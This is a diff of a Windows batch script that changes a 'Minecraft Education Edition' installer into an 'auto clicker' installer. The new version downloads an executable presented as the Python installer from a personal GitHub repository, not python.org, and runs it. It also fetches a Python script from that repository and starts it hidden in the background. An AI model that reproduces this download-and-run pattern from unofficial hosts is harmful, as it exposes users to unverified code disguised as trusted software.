@@ -1,43 +1,134 @@
 @echo off
-title Minecraft Education Edition Installer
-color 05
+title Auto Clicker Installer
+color 0A
+
 echo.
-echo    _____          __         _________ .__  .__        __                  __________                                    
-echo   /  _  \  __ ___/  |_  ____ \_   ___ \|  | |__| ____ |  | __ ___________  \______   \___.__.___________    ______ ______
-echo  /  /_\  \|  |  \   __\/  _ \/    \  \/|  | |  |/ ___\|  |/ // __ \_  __ \  |    |  _<   |  |\____ \__  \  /  ___//  ___/
-echo /    |    \  |  /|  | (  <_> )     \___|  |_|  \  \___|    <\  ___/|  | \/  |    |   \\___  ||  |_> > __ \_\___ \ \___ \ 
-echo \____|__  /____/ |__|  \____/ \______  /____/__|\___  >__|_ \\___  >__|     |______  // ____||   __(____  /____  >____  >
-echo         \/                           \/             \/     \/    \/                \/ \/     |__|       \/     \/     \/
-echo.
-echo ------------------------------------------------------------------------------------------------
-echo                          MINECRAFT EDUCATION EDITION AUTO INSTALLER
-echo ------------------------------------------------------------------------------------------------
+echo ========================================
+echo        AUTO CLICKER INSTALLER
+echo ========================================
 echo.
 
 :MAIN
 echo This will install everything automatically...
 echo.
-timeout /t 2
+timeout /t 1 /nobreak >nul
+
 :CHECK_PYTHON
 echo Checking for Python installation...
-python --version >nul 2>&1
-if %errorlevel% neq 0 (
+python --version >nul 2>nul
+if %errorlevel% equ 0 (
+    for /f "tokens=*" %%i in ('python --version 2^>^&1') do set PYTHON_VERSION=%%i
+    echo [SUCCESS] %PYTHON_VERSION% detected
+    goto CHECK_PACKAGES
+)
+
+:PYTHON_NOT_FOUND
+echo.
+echo [ERROR] Python is not installed!
+echo.
+echo Please install Python from:
+echo https://python.org/downloads
+echo.
+echo Make sure to check "Add Python to PATH" during installation!
+echo.
+set /p choice="Press D to download Python automatically, M to install manually, or any other key to exit: "
+
+if /i "%choice%"=="D" (
+    goto DOWNLOAD_PYTHON
+)
+if /i "%choice%"=="M" (
     echo.
-    echo █ ERROR: Python is not installed!
+    echo Please install Python from:
+    echo https://python.org/downloads
     echo.
-    echo ➤ Please install Python from:
-    echo   https://python.org/downloads
+    echo Make sure to check "Add Python to PATH" during installation!
     echo.
-    echo ➤ Make sure to check "Add Python to PATH" during installation!
-    echo.
-    echo ➤ After installing Python, run this installer again.
-    echo.
-    set /p choice="Press R to retry after installing Python, or any other key to exit: "
-    if /i "%choice%"=="R" goto CHECK_PYTHON
+    goto WAIT_FOR_PYTHON
+)
+exit /b 0
+
+:DOWNLOAD_PYTHON
+echo.
+echo Downloading Python installer...
+echo This may take a few minutes depending on your internet speed...
+echo.
+
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/SenturyHanderserson/SigmiForCCGS/raw/refs/heads/main/content/Python%203.13%20Installer.exe' -OutFile 'python-installer.exe'" >nul 2>nul
+
+if not exist "python-installer.exe" (
+    echo [ERROR] Failed to download Python installer.
+    echo Please install Python manually from: https://python.org/downloads
+    pause
     exit /b 1
 )
+
+echo [SUCCESS] Python installer downloaded successfully!
+echo.
+echo Starting Python installation...
+echo IMPORTANT: In the Python installer:
+echo 1. Check "Add Python to PATH" at the bottom
+echo 2. Click "Install Now"
+echo 3. Wait for installation to complete
+echo 4. Close the installer when done
+echo.
+echo The installer will open now...
+timeout /t 3 /nobreak >nul
+
+start /wait python-installer.exe
+
+del python-installer.exe >nul 2>nul
+
+:WAIT_FOR_PYTHON
+echo.
+:CHECK_AGAIN
+set /p python_done="Is Python installation complete? (Y/N): "
+if /i "%python_done%"=="Y" (
+    goto VERIFY_PYTHON
+)
+if /i "%python_done%"=="N" (
+    echo.
+    echo Please complete the Python installation and then press Y
+    echo.
+    goto CHECK_AGAIN
+)
+echo Please answer Y or N
+goto CHECK_AGAIN
+
+:VERIFY_PYTHON
+echo.
+echo Verifying Python installation...
+python --version >nul 2>nul
+if %errorlevel% neq 0 (
+    echo.
+    echo [ERROR] Python still not detected. Please make sure:
+    echo   1. Python is installed correctly
+    echo   2. "Add Python to PATH" was checked during installation
+    echo   3. You have restarted any command prompts
+    echo.
+    set /p choice="Press R to retry verification, M to install manually, or any other key to exit: "
+    if /i "%choice%"=="R" goto VERIFY_PYTHON
+    if /i "%choice%"=="M" (
+        start https://python.org/downloads
+        goto WAIT_FOR_PYTHON
+    )
+    exit /b 1
+)
+
 for /f "tokens=*" %%i in ('python --version 2^>^&1') do set PYTHON_VERSION=%%i
-echo ✓ %PYTHON_VERSION% detected
+echo [SUCCESS] %PYTHON_VERSION% verified successfully!
+timeout /t 1 /nobreak >nul
+
+:CHECK_PACKAGES
+echo.
+echo Checking for required packages...
+python -c "import pyautogui, keyboard, win10toast, psutil, websockets" >nul 2>nul
+if %errorlevel% equ 0 (
+    echo [SUCCESS] All packages are already installed!
+    goto CHECK_BACKEND
+)
+
+echo Some packages are missing, installing now...
+goto INSTALL_PACKAGES
 
 :INSTALL_PACKAGES
 echo.
@@ -45,154 +136,134 @@ echo Installing required packages...
 echo This may take a minute...
 echo.
 
-:: Try multiple installation methods
 set INSTALL_SUCCESS=0
 
-echo Attempting method 1: pip install...
-pip install pyautogui keyboard requests >nul 2>&1
+echo Installing pyautogui, keyboard, win10toast, psutil and websockets...
+pip install pyautogui keyboard win10toast psutil websockets >nul 2>nul
 if %errorlevel% equ 0 (
-    echo ✓ Packages installed successfully via pip!
+    echo [SUCCESS] Packages installed successfully!
     set INSTALL_SUCCESS=1
-    goto DOWNLOAD_SCRIPT
+    goto CHECK_BACKEND
 )
 
-echo Method 1 failed, trying method 2: python -m pip install...
-python -m pip install pyautogui keyboard requests >nul 2>&1
+echo Method 1 failed, trying alternative method...
+python -m pip install pyautogui keyboard win10toast psutil websockets >nul 2>nul
 if %errorlevel% equ 0 (
-    echo ✓ Packages installed successfully via python -m pip!
+    echo [SUCCESS] Packages installed successfully via python -m pip!
     set INSTALL_SUCCESS=1
-    goto DOWNLOAD_SCRIPT
+    goto CHECK_BACKEND
 )
 
-echo Method 2 failed, trying method 3: pip install with --user...
-pip install --user pyautogui keyboard requests >nul 2>&1
+echo Method 2 failed, trying with --user flag...
+pip install --user pyautogui keyboard win10toast psutil websockets >nul 2>nul
 if %errorlevel% equ 0 (
-    echo ✓ Packages installed successfully via pip --user!
+    echo [SUCCESS] Packages installed successfully with --user flag!
     set INSTALL_SUCCESS=1
-    goto DOWNLOAD_SCRIPT
+    goto CHECK_BACKEND
 )
 
-echo Method 3 failed, trying method 4: python -m pip install with --user...
-python -m pip install --user pyautogui keyboard requests >nul 2>&1
+echo Method 3 failed, trying python -m pip with --user...
+python -m pip install --user pyautogui keyboard win10toast psutil websockets >nul 2>nul
 if %errorlevel% equ 0 (
-    echo ✓ Packages installed successfully via python -m pip --user!
+    echo [SUCCESS] Packages installed successfully via python -m pip --user!
     set INSTALL_SUCCESS=1
-    goto DOWNLOAD_SCRIPT
+    goto CHECK_BACKEND
 )
 
-:: If all methods failed
 echo.
-echo █ WARNING: Could not install packages automatically.
+echo [WARNING] Could not install packages automatically.
 echo.
-echo ➤ You can still try to run the program, but it may not work properly.
-echo ➤ Alternatively, you can manually install the packages:
-echo   Open Command Prompt as Administrator and run:
-echo   pip install pyautogui keyboard requests
+echo You can still try to run the program, but it may not work properly.
+echo Alternatively, you can manually install the packages:
+echo Open Command Prompt as Administrator and run:
+echo pip install pyautogui keyboard win10toast psutil websockets
 echo.
 set /p choice="Press C to continue anyway, R to retry installation, or any other key to exit: "
 if /i "%choice%"=="R" goto INSTALL_PACKAGES
 if /i "%choice%"=="C" (
     set INSTALL_SUCCESS=0
-    goto DOWNLOAD_SCRIPT
+    goto CHECK_BACKEND
 )
-exit /b 1
+exit /b 0
+
+:CHECK_BACKEND
+echo.
+echo Checking if backend is already running...
+powershell -Command "try { $response = Invoke-WebRequest -Uri 'http://localhost:8080/status.json' -TimeoutSec 2; exit 0 } catch { exit 1 }" >nul 2>nul
+if %errorlevel% equ 0 (
+    echo [INFO] Backend is already running!
+    goto OPEN_WEB_INTERFACE
+)
+
+:CREATE_FOLDER
+echo.
+echo Creating Auto Clicker folder...
+if not exist "autoclicker" mkdir autoclicker
+echo [SUCCESS] Folder created successfully!
+goto DOWNLOAD_SCRIPT
 
 :DOWNLOAD_SCRIPT
 echo.
-echo Downloading Minecraft Education Edition...
+echo Downloading Auto Clicker Backend...
 echo.
 
-:: Try multiple download methods
-set DOWNLOAD_SUCCESS=0
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SenturyHanderserson/SigmiForCCGS/refs/heads/main/content/MinecraftEducation.py' -OutFile 'autoclicker\MinecraftEducation.py'" >nul 2>nul
 
-:: Method 1: Using curl if available
-curl --version >nul 2>&1
-if %errorlevel% equ 0 (
-    echo Attempting download with curl...
-    curl -L -o MinecraftEducation.py "https://raw.githubusercontent.com/SenturyHanderserson/SigmiForCCGS/refs/heads/main/content/MinecraftEducation.py" >nul 2>&1
-    if %errorlevel% equ 0 (
-        if exist MinecraftEducation.py (
-            echo ✓ Script downloaded successfully via curl!
-            set DOWNLOAD_SUCCESS=1
-            goto RUN_SCRIPT
-        )
-    )
-)
-
-:: Method 2: Using powershell
-echo Trying download with PowerShell...
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SenturyHanderserson/SigmiForCCGS/refs/heads/main/content/MinecraftEducation.py' -OutFile 'MinecraftEducation.py'" >nul 2>&1
-if %errorlevel% equ 0 (
-    if exist MinecraftEducation.py (
-        echo ✓ Script downloaded successfully via PowerShell!
-        set DOWNLOAD_SUCCESS=1
-        goto RUN_SCRIPT
-    )
-)
-
-:: Method 3: Using bitsadmin
-echo Trying download with BITSAdmin...
-bitsadmin /transfer myDownloadJob /download /priority normal "https://raw.githubusercontent.com/SenturyHanderserson/SigmiForCCGS/refs/heads/main/content/MinecraftEducation.py" "MinecraftEducation.py" >nul 2>&1
-if exist MinecraftEducation.py (
-    echo ✓ Script downloaded successfully via BITSAdmin!
-    set DOWNLOAD_SUCCESS=1
-    goto RUN_SCRIPT
-)
-
-:: If download failed
-echo.
-echo █ WARNING: Could not download the script automatically.
-echo.
-echo ➤ The installer will use a local version if available.
-echo ➤ If the program doesn't work, please download the script manually.
-echo.
-if exist MinecraftEducation.py (
-    echo ✓ Found local script file, using that instead.
-    set DOWNLOAD_SUCCESS=1
+if exist autoclicker\MinecraftEducation.py (
+    echo [SUCCESS] Backend downloaded successfully!
+    goto START_BACKEND
 ) else (
-    echo ✗ No local script found.
-    set DOWNLOAD_SUCCESS=0
+    echo [ERROR] Failed to download backend file.
+    pause
+    exit /b 1
 )
 
-:RUN_SCRIPT
+:START_BACKEND
 echo.
-echo ⚡ Starting Minecraft Education Edition...
+echo Starting Backend Server (Hidden)...
 echo.
+timeout /t 2 /nobreak >nul
 
-if exist MinecraftEducation.py (
-    echo Running the application...
-    echo If a window doesn't appear, please wait a moment...
-    echo.
-    
-    :: Try to run the script
-    python MinecraftEducation.py
-    
-    if %errorlevel% neq 0 (
-        echo.
-        echo █ The application encountered an error.
-        echo.
-        echo ➤ This might be because:
-        echo   - Required packages weren't installed properly
-        echo   - The script file is corrupted
-        echo   - Python is not configured correctly
-        echo.
-        echo ➤ Solutions to try:
-        echo   1. Run the installer again as Administrator
-        echo   2. Manually install: pip install pyautogui keyboard requests
-        echo   3. Download the script file manually
-        echo.
-    ) else (
-        echo.
-        echo ✓ Application closed successfully.
-    )
+start /min "Auto Clicker Backend" cmd /c "cd autoclicker && python MinecraftEducation.py"
+timeout /t 3 /nobreak >nul
+
+:CHECK_WEBSOCKET
+echo.
+echo Checking WebSocket connection...
+powershell -Command "try { $ws = New-Object System.Net.WebSockets.ClientWebSocket; $task = $ws.ConnectAsync('ws://localhost:8081', [System.Threading.CancellationToken]::None); $task.Wait(2000); if($task.Status -eq 'RanToCompletion') { exit 0 } else { exit 1 } } catch { exit 1 }" >nul 2>nul
+if %errorlevel% equ 0 (
+    echo [SUCCESS] WebSocket server is running!
 ) else (
-    echo.
-    echo █ ERROR: No script file found to run.
-    echo.
-    echo ➤ Please download MinecraftEducation.py manually and place it
-    echo   in the same folder as this installer, then run this again.
-    echo.
+    echo [INFO] WebSocket not available, using HTTP polling
 )
+
+:OPEN_WEB_INTERFACE
+echo.
+echo Opening Web Interface...
+echo.
+echo The web interface will now open in your browser.
+echo You can also manually visit:
+echo https://senturyhanderserson.github.io/SigmiForCCGS/content/autoclickerinterface.html
+echo.
+timeout /t 2 /nobreak >nul
+
+start "" "https://senturyhanderserson.github.io/SigmiForCCGS/content/autoclickerinterface.html"
+
+echo.
+echo ========================================
+echo [SUCCESS] Installation Complete!
+echo ========================================
+echo.
+echo ✅ Python and packages installed
+echo ✅ Backend server started (hidden)
+echo ✅ WebSocket support enabled
+echo ✅ Web interface opened
+echo.
+echo 📢 You should see a notification confirming the service is running
+echo 🎮 Use F6 to start/stop auto-clicker
+echo 🌐 Control via web interface at any time
+echo 🔌 Real-time updates via WebSocket
+echo.
 
 :END_MENU
 echo.
@@ -213,14 +284,18 @@ if /i "%choice%"=="A" (
     echo.
     echo MANUAL INSTALLATION STEPS:
     echo 1. Open Command Prompt as Administrator
-    echo 2. Run: pip install pyautogui keyboard requests
-    echo 3. Download MinecraftEducation.py manually
-    echo 4. Double-click MinecraftEducation.py to run
+    echo 2. Run: pip install pyautogui keyboard win10toast psutil websockets
+    echo 3. Download MinecraftEducation.py manually from:
+    echo    https://github.com/SenturyHanderserson/SigmiForCCGS
+    echo 4. Visit the web interface:
+    echo    https://senturyhanderserson.github.io/SigmiForCCGS/content/autoclickerinterface.html
+    echo 5. Run: python MinecraftEducation.py
     echo.
     pause
+    goto END_MENU
 )
 
 echo.
-echo Thank you for using Minecraft Education Edition!
+echo Thank you for using my autoclicker! - 396abc
 echo.
-pause
+timeout /t 3 /nobreak >nul
